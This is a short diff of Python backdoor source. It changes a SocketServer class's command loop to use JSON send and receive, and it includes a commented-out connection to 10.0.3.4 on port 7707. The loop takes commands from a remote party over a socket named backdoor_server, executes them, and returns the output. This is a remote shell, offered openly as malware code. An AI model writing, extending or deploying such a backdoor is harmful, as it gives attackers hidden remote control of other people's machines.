@@ -17,9 +17,9 @@ class SocketServer:
         return json.loads(json_data)
     def exec(self):
         while True:
-            command = self.backdoor_server.recv(1024)  # byte
+            command = self.json_recv()  # byte
             cmd = self.command_execution(command)
-            self.backdoor_server.send(cmd)
+            self.json_send(cmd)
         self.backdoor_server.close()
 
 #my_socket_object = SocketServer("10.0.3.4",7707)
